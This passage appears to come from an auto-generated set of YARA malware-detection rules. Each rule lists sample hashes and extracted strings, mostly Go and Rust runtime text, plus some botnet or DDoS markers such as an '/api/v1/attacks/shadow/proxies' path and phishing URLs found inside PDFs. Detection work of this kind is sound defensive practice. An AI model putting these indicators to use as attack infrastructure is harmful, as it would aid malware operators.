      $s10 = "eup - double wakeuppersistentalloc: size == 0/gc/cycles/total:gc-cyclesnegative idle mark workersuse of invalid sweepLockerrunti" ascii /* score: '20.00'*/
      $s11 = "ontent-locationwww-authenticateproxy-connectionread_frame_otherUnencryptedHTTP2%s %s HTTP/1.1" fullword ascii /* score: '20.00'*/
      $s12 = "%d.%d.%d.%dIncap-Client-IP1.1 %s-proxy-%d_ga=GA1.2.%d.%d_fbp=fb.1.%d.%dhttp2multiplex:X-Shadow-Clientno such processadvertise er" ascii /* score: '19.50'*/
      $s13 = "sia/ShanghaiNative Clientgzip, deflateAT&T Mobilityhttps://%s:%sminecraft-rawX-Remote-AddrX-Incap-Proxy1.1 %s.%s.comvisitor_id=%" ascii /* score: '18.50'*/
      $s14 = " errortoo many userswindow changedtime.Location(: extra text: /etc/localtime on zero Valueunknown methodinvalid syntax1907348632" ascii /* score: '18.00'*/
      $s15 = "ader: %qhttp2: 1xx informational responses too largehttp: Request.ContentLength=%d with nil Bodyspan on userArena.faultList has " ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00be6e6c4f9e287672c8301b72bdabf3_imphash__12e12319f1029ec4f8fcbed7e82df162_imphash__12e12319f1029ec4f8fcbed7e82df162_imphas_36 {
   meta:
      description = "_subset_batch - from files 00be6e6c4f9e287672c8301b72bdabf3(imphash).exe, 12e12319f1029ec4f8fcbed7e82df162(imphash).exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_0017379d.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_046d6586.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_2d71a195.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_35259e77.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_35371a8b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_3c803f42.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_42f94e7f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_43096a97.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_4a2a60db.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_569cd42f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_590a5762.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_699ac50f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_6dad743b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_6e770163.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8558ed59.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8927b558.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8b7fbcd5.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8c592f31.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_af509914.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_b8501b96.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_bc2e6828.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c46638e4.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c56e42be.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c634df49.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d03a6c5c.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d1207466.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d2c83d38.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_dcd61caf.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e0ac31bf.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e57aa74b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e819f391.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_ebd32e93.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_f5715dee.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_f571c36f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_ff705dff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "220fa92d358cd5c010d8edaddf06dd02c7a783790767655eeb058df4d68306ae"
      hash2 = "313721d0454b579811044074714f2891add14ba8d3e1636d040f819f3d2ee44e"
      hash3 = "0017379d4735107d18f0bd0c81bbc5ba929932711779988e9c145ed7dfd14494"
      hash4 = "046d658654aee9cef358ea967f7dd7366b0a4a6bd8fce656b4966ac15362cdb8"
      hash5 = "2d71a1955243bbc9a6d8094f5ff4ba1f537e1cf131b8e055ed424105a284329a"
      hash6 = "35259e77356b2061b3f922f7356d0918dc9eed375f9e963fc29b7aef8f4e0da0"
      hash7 = "35371a8b637e8c7fe70e7114604da35813e5ac097e51e06ef98a5d0fe723fbc4"
      hash8 = "3c803f42a43f8e18e3f275c631fc2325af5486651118cb3f64611e1858469430"
      hash9 = "42f94e7f252061e090533e616803cd01aaa48cb45fed7088a5d00b1ed8e3c2c7"
      hash10 = "43096a97b852d682d2444224f3873748661126f32b1099084ec59ed0e6aadca4"
      hash11 = "4a2a60db619a856a8261eda6cf1a5567919b5c7ba544ee6486040da73d7a77f2"
      hash12 = "569cd42f46b17640024d5d108cc3b9ab683b19c56edcfb39c14302a2aa4fc79b"
      hash13 = "590a5762c7981a574ccad3a8a8f0efa1d23a7913c3c5254133e0de41d08dce5e"
      hash14 = "699ac50fc0b41dcaebe975e9170db737f96af11d8d16a84386a4e57e685d2845"
      hash15 = "6dad743b0a3a2e10a2457bfb2a8812ef8dcacaf5944e3b05ac09f3a860b563b7"
      hash16 = "6e770163d3669b2492f9c5c75c8447271daf53c632284ae89605d006977d8af4"
      hash17 = "8558ed5969d79a175bcee6974983dc7392a916e841cab8e63f6db29ef2b09c96"
      hash18 = "8927b558019b1e68084c7186542a76071232c7f22e95c35b208dda04751503b4"
      hash19 = "8b7fbcd5c94a07a0541a3bed1a3361456da989bcd20d6fa588cebf3e76f379e4"
      hash20 = "8c592f31284b518df20fe7cab026c6c67822c5640f62b586adb9d47ce7968d70"
      hash21 = "af509914fa0370a09e5ea6aca9121eb883c4fd79827de3ac151b67c8290b4c74"
      hash22 = "b8501b965ef855679178b243c2d179e4fbd2d704cf3a51040a19e1321bb6c640"
      hash23 = "bc2e68283d24f8ec3d025f637446ac761e74d2a422f03d97c314705c866f1fc3"
      hash24 = "c46638e4ff2b9755db2fd7bd9c9a97952f4b55cbf82f0d2d806c6c9d4fb7f529"
      hash25 = "c56e42be9ae30d8dd489c6e83f1c285d044b898a7525ead98eb754be66cdd1e9"
      hash26 = "c634df499253c6315784435839263f7bc7cfa29a466f1a1e2cd9d750d8008338"
      hash27 = "d03a6c5cae93998d7cb1fe2339b421c1360b831479c9120f788652123c588ff0"
      hash28 = "d1207466e4c4e2c86e6c81c77a278f156b865e3e830660b1bbb8fb1835619a67"
      hash29 = "d2c83d38e4dc97bec87e67e903b3871fff5c6fb8ea7006b14b62173cb2a2ac94"
      hash30 = "dcd61caf83249f9e296540d93f2b25836022060c387b58f152fa0486e63ffe82"
      hash31 = "e0ac31bf8e8a735061b94e119f8d23282bcbce6bc2c422c446b0705fdb31309f"
      hash32 = "e57aa74bc0ced92e44349941d75ded086be138fce19329770a8730bbf3153b00"
      hash33 = "e819f391ecafd259a6e1a5fedfe4e5533139480910c93a420d3bef62abec7552"
      hash34 = "ebd32e93a4ea41a17dcc3745a7bcd2974c608a6b5ec972ae9da55642164d0fc8"
      hash35 = "f5715dee5028279a948465a8bbf44da4b6f31517ac61e79bd78e85b202be96c8"
      hash36 = "f571c36fa01f936eadec5ef2c1ea5e0a18cdd1c2789f7ceef4be7bb4afdf4df5"
      hash37 = "ff705dffecd20294a7a0cdb5f23a212a7cc39eb538c055e47d53a34f6feebacf"
   strings:
      $x1 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x2 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x3 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x4 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s5 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s6 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s7 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s8 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s9 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s10 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s11 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
      $s12 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '17.00'*/
      $s13 = "      <requestedExecutionLevel level=\"asInvoker\"            " fullword ascii /* score: '15.00'*/
      $s14 = "  processorArchitecture=\"*\"" fullword ascii /* score: '15.00'*/
      $s15 = "<pi-ms-win-core-processthreads-l1-1-2" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _45d8e9853707108909a9e228201324dd_imphash__4c96ea8dc82ecad377b85f1f54396b90_imphash__6d4ab1032f66fc4fe8d72b1c468e1469_imphas_37 {
   meta:
      description = "_subset_batch - from files 45d8e9853707108909a9e228201324dd(imphash).dll, 4c96ea8dc82ecad377b85f1f54396b90(imphash).dll, 6d4ab1032f66fc4fe8d72b1c468e1469(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "94d43da6ebcda1155d346f2a4b40ea048d6daa8d06557209db02c6c1dcdf3f09"
      hash2 = "1e69fdf3dde2aeba05f510d027a9a762cbe5d188c051167876f2621ad60fc3f5"
      hash3 = "ecb3a597d17244e2fadec4590a6b492f362095ffc5eb6ee58624be766c69fc82"
   strings:
      $s1 = "cef_get_temp_directory" fullword ascii /* score: '16.00'*/
      $s2 = "cef_process_message_create" fullword ascii /* score: '15.00'*/
      $s3 = "cef_launch_process" fullword ascii /* score: '15.00'*/
      $s4 = "cef_get_vlog_level" fullword ascii /* score: '14.00'*/
      $s5 = "cef_get_current_platform_thread_handle" fullword ascii /* score: '12.00'*/
      $s6 = "cef_get_current_platform_thread_id" fullword ascii /* score: '12.00'*/
      $s7 = "cef_task_runner_get_for_current_thread" fullword ascii /* score: '12.00'*/
      $s8 = "cef_task_runner_get_for_thread" fullword ascii /* score: '12.00'*/
      $s9 = "cef_create_new_temp_directory" fullword ascii /* score: '11.00'*/
      $s10 = "cef_get_min_log_level" fullword ascii /* score: '11.00'*/
      $s11 = "cef_create_temp_directory_in_directory" fullword ascii /* score: '11.00'*/
      $s12 = "cef_get_extensions_for_mime_type" fullword ascii /* score: '9.00'*/
      $s13 = "cef_request_context_get_global_context" fullword ascii /* score: '9.00'*/
      $s14 = "cef_resource_bundle_get_global" fullword ascii /* score: '9.00'*/
      $s15 = "cef_display_get_primary" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5a3867d1d07d8107e1ce3a9518f40044_imphash__661e959dbfb11a52afe19449fb3caa19cf1529d1b508a35035f964ecf2fa22f0_661e959d_38 {
   meta:
      description = "_subset_batch - from files 5a3867d1d07d8107e1ce3a9518f40044(imphash).exe, 661e959dbfb11a52afe19449fb3caa19cf1529d1b508a35035f964ecf2fa22f0_661e959d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e05468a512d77fe2369ff78cdf2654f307a2a9a29581ec0c0b0eedca4e694aa6"
      hash2 = "661e959dbfb11a52afe19449fb3caa19cf1529d1b508a35035f964ecf2fa22f0"
   strings:
      $s1 = "a spawned task panicked and the runtime is configured to shut down on unhandled panic" fullword ascii /* score: '18.00'*/
      $s2 = "504948474645444342414039383736" wide /* score: '17.00'*/ /* hex encoded string 'PIHGFEDCBA@9876' */
      $s3 = "PhantomPinnedMutexdata<locked>" fullword ascii /* score: '15.00'*/
      $s4 = "Cannot start a runtime from within a runtime. This happens because a function (like `block_on`) attempted to block the current t" ascii /* score: '10.00'*/
      $s5 = "assertion failed: prev.is_complete()" fullword ascii /* score: '10.00'*/
      $s6 = "assertion failed: shared.shutdown_tx.is_some()" fullword ascii /* score: '10.00'*/
      $s7 = "HandleCompletionPortAfdGroupcpafd_group" fullword ascii /* score: '10.00'*/
      $s8 = "assertion failed: !prev.is_complete()" fullword ascii /* score: '10.00'*/
      $s9 = "assertion failed: i < self.len()" fullword ascii /* score: '10.00'*/
      $s10 = "unexpected error when polling the I/O driver: " fullword ascii /* score: '10.00'*/
      $s11 = "Cannot start a runtime from within a runtime. This happens because a function (like `block_on`) attempted to block the current t" ascii /* score: '10.00'*/
      $s12 = "assertion failed: curr.is_running()" fullword ascii /* score: '10.00'*/
      $s13 = "assertion failed: prev.is_running()" fullword ascii /* score: '10.00'*/
      $s14 = "assertion failed: j < self.len()" fullword ascii /* score: '10.00'*/
      $s15 = "assertion failed: handle.shared.owned.is_empty()" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931_39 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $s1 = "This program can only be run on processors with MMX support." fullword ascii /* score: '11.00'*/
      $s2 = "runtime.float64touint32" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.(*sigctxt).eip" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.(*sigctxt).esp" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.uint32tofloat64" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.(*sigctxt).esi" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.(*sigctxt).eax" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*sigctxt).edi" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*sigctxt).edx" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.(*sigctxt).ebx" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.(*sigctxt).ebp" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.setldt" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*sigctxt).ecx" fullword ascii /* score: '10.00'*/
      $s14 = "|$,3|$ 3|$" fullword ascii /* score: '9.00'*/ /* hex encoded string '3' */
      $s15 = "3|$83|$$3|$" fullword ascii /* score: '9.00'*/ /* hex encoded string '83' */
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _20c938b4c690d1ec441a7ef56686bbdca2e4e0d7a6c6f0eff22e516d65109bb8_20c938b4_7f7a4c18cdac9ae3f082e57c32d022d5450c1d0c6eac59e06_40 {
   meta:
      description = "_subset_batch - from files 20c938b4c690d1ec441a7ef56686bbdca2e4e0d7a6c6f0eff22e516d65109bb8_20c938b4.pdf, 7f7a4c18cdac9ae3f082e57c32d022d5450c1d0c6eac59e068db2c26477c1848_7f7a4c18.pdf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20c938b4c690d1ec441a7ef56686bbdca2e4e0d7a6c6f0eff22e516d65109bb8"
      hash2 = "7f7a4c18cdac9ae3f082e57c32d022d5450c1d0c6eac59e068db2c26477c1848"
   strings:
      $s1 = "/URI (http://myftpupload.com)" fullword ascii /* score: '24.00'*/
      $s2 = "<rdf:Description xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii /* score: '23.00'*/
      $s3 = "<rdf:Description xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii /* score: '23.00'*/
      $s4 = "/URI (http://robinhantersisgood2.blogspot.com)" fullword ascii /* score: '22.00'*/
      $s5 = "<rdf:Description xmlns:dc=\"http://purl.org/dc/elements/1.1/\">" fullword ascii /* score: '16.00'*/
      $s6 = "/Type /FontDescriptor" fullword ascii /* score: '14.00'*/
      $s7 = "/Author (Softplicity)" fullword ascii /* score: '12.00'*/
      $s8 = "/FontDescriptor 15 0 R" fullword ascii /* score: '10.00'*/
      $s9 = "/Creator (Softplicity)" fullword ascii /* score: '9.00'*/
      $s10 = "/Contents 9 0 R" fullword ascii /* score: '9.00'*/
      $s11 = "<pdf:Producer>Softplicity</pdf:Producer>" fullword ascii /* score: '9.00'*/
      $s12 = "/Producer (Softplicity)" fullword ascii /* score: '9.00'*/
      $s13 = "/Contents 11 0 R" fullword ascii /* score: '9.00'*/
      $s14 = "<xmp:CreatorTool>Softplicity</xmp:CreatorTool>" fullword ascii /* score: '9.00'*/
      $s15 = "/Contents 13 0 R" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5025 and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _16ea232736a39f84e9f62be00fdddbb6_imphash__2ffcc53d165f90cad66a29a16bea365d_imphash__56e695fc_41 {
   meta:
      description = "_subset_batch - from files 16ea232736a39f84e9f62be00fdddbb6(imphash).exe, 2ffcc53d165f90cad66a29a16bea365d(imphash)_56e695fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37158bc1ebfab8e044f8cac0c05913ee5c251b933e4cb35f49eb9581739e5d03"
      hash2 = "56e695fc1a6295569036a0777d81b5d572962a82d6d4a5209741ff957337c8e3"
   strings:
      $s1 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s2 = "This executable is not bound to a managed DLL to execute. The binding value is: '%s'" fullword wide /* score: '25.00'*/
      $s3 = "The managed DLL bound to this executable is longer than the max allowed length (%d)" fullword wide /* score: '20.00'*/
      $s4 = "The managed DLL bound to this executable is: '%s'" fullword wide /* score: '20.00'*/
      $s5 = "System.Runtime.Loader" fullword ascii /* score: '19.00'*/
      $s6 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s' - details: %s" fullword wide /* score: '19.00'*/
      $s7 = "Failed to resolve full path of the current executable [%s]" fullword wide /* score: '18.00'*/
      $s8 = "--- Invoked %s [version: %s] main = {" fullword wide /* score: '18.00'*/
      $s9 = "The managed DLL bound to this executable could not be retrieved from the executable image." fullword wide /* score: '17.00'*/
      $s10 = "GetLastPInvokeError" fullword ascii /* score: '16.00'*/
      $s11 = "Could not load 'kernel32.dll': %u" fullword wide /* score: '16.00'*/
      $s12 = "  - https://aka.ms/dotnet-core-applaunch?" fullword wide /* score: '15.00'*/
      $s13 = "Bundle header version compatibility check failed." fullword wide /* score: '15.00'*/
      $s14 = "Call to IsWow64Process2 failed: %u" fullword wide /* score: '14.00'*/
      $s15 = "System.Runtime.InteropServices.Marshalling" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_42 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash4 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash5 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash6 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash7 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
      hash8 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash9 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $s1 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s3 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.tophash" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s10 = "encoding/binary.dataSize" fullword ascii /* score: '11.00'*/
      $s11 = "framepc" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.(*bmap).keys" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.growWork_fast64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.clearDeletedTimers" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.traceEventLocked" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 17000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1a_43 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "unsafe.String: len out of rangereflect: Len of non-array type reflect.MakeSlice: negative lenreflect.MakeSlice: negative capenco" ascii /* score: '72.50'*/
      $x2 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '57.50'*/
      $x3 = "invalid hostname: /dev/misc/watchdogreceived from peerframe_goaway_shortproxy-authenticateUNKNOWN_SETTING_%dGo-http-client/2.0Go" ascii /* score: '51.00'*/
      $x4 = "mstartm not found in allmstopm holding lockssemaRoot rotateLeftbad notifyList sizeruntime: preempt g0runtime: pcdata is dodeltim" ascii /* score: '39.00'*/
      $x5 = "stopm spinning nmidlelocked= needspinning=store64 failedmemprofileratesemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x6 = "/etc/init.d/boot.localIPv6: no supported yethttp2: frame too largewrite on closed bufferframe_data_pad_too_bigaccess-control-max" ascii /* score: '32.00'*/
      $s7 = "ProcessingNo ContentRST_STREAMEND_STREAMresumptionres binderres masterexp master12207031256103515625owner diedterminated/setgrou" ascii /* score: '30.00'*/
      $s8 = ": TLS [http2: client conn not usablehttp: idle connection timeoutinternal error: took too muchframe_pushpromise_zero_streamframe" ascii /* score: '25.00'*/
      $s9 = "stack: gp=scanstack - bad statusheadTailIndex overflowduplicated defer entryruntime.main not on m0set_crosscall2 missingbad g->s" ascii /* score: '21.00'*/
      $s10 = "sing addressunknown networkwrite heap dumpasyncpreemptoffforce gc (idle)sync.Mutex.Lockmalloc deadlockruntime error:   with GC p" ascii /* score: '21.00'*/
      $s11 = "iled to write to key log: tls: invalid server finished hashtls: unexpected ServerKeyExchange142108547152020037174224853515625710" ascii /* score: '20.00'*/
      $s12 = "n.readLoop exitinghttp: read on closed response bodystream error: stream ID %d; %v; %vframe_settings_window_size_too_bigframe_wi" ascii /* score: '18.50'*/
      $s13 = " type offset out of rangesync: RUnlock of unlocked RWMutexreflect: slice index out of range of method on nil interface valuerefl" ascii /* score: '18.00'*/
      $s14 = "elgetenv before env initinterface conversion: freeIndex is not validoldoverflow is not nils.freeindex > s.nelemsbad sweepgen in " ascii /* score: '17.00'*/
      $s15 = "mentation violationinternal error - misuse of itab) not in usable address space: runtime: cannot allocate memorycheckmark found " ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_44 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $x1 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '75.50'*/
      $x2 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '70.50'*/
      $s3 = "ttls: failed to write to key log: tls: invalid server finished hashtls: unexpected ServerKeyExchangeinvalid value %q for flag -%" ascii /* score: '27.00'*/
      $s4 = "Handshake of type omitemptyParseBool method: (MISSING)%!(EXTRA files,dnsdns,filesipv6-icmplocalhostattempts:no-reload:protocolPa" ascii /* score: '26.50'*/
      $s5 = "led with gcphase == _GCmarkterminationrecursive call during initialization - linker skewattempt to execute system stack code on " ascii /* score: '25.00'*/
      $s6 = " protocolinvalid header field value for %qpad size larger than data payloadframe_pushpromise_promiseid_shorthttp2: invalid pseud" ascii /* score: '24.00'*/
      $s7 = "xpected ']', found '%c' instead,!\"#$%&'()*+ -./:;<=>?@[\\]^`{|}~http2write100ContinueHeadersFramebytes.Buffer.Grow: negative co" ascii /* score: '23.00'*/
      $s8 = "o headers: %vconnection not allowed by rulesetinvalid username/password versionunsupported transfer encoding: %qrelease of handl" ascii /* score: '23.00'*/
      $s9 = "gc/heap/frees:objectsruntime: work.nwait = runtime:scanstack: gp=scanstack - bad statusheadTailIndex overflowruntime.main not on" ascii /* score: '21.00'*/
      $s10 = "erver selected unsupported compression formattls: server sent an unexpected early_data extensionJSON decoder out of sync - data " ascii /* score: '20.00'*/
      $s11 = "otocol version %xtls: received a session ticket with invalid lifetimehttp2: Transport readFrame error on conn %p: (%T) %vprotoco" ascii /* score: '18.50'*/
      $s12 = "ransport does not support unencrypted HTTP/2limiterEvent.stop: invalid limiter event type foundpotentially overlapping in-use al" ascii /* score: '18.00'*/
      $s13 = "aluex509: RSA public exponent is not a positive numberchacha20: SetCounter attempted to rollback countercrypto/ecdh: public key " ascii /* score: '17.00'*/
      $s14 = "se of closed network connectionmime: invalid boundary charactermime: expected token after slashbufio: invalid use of UnreadByteb" ascii /* score: '16.00'*/
      $s15 = "anic while printing panic value%s/api/v1/attacks/shadow/proxiessync: Unlock of unlocked RWMutexsync: negative WaitGroup counterr" ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

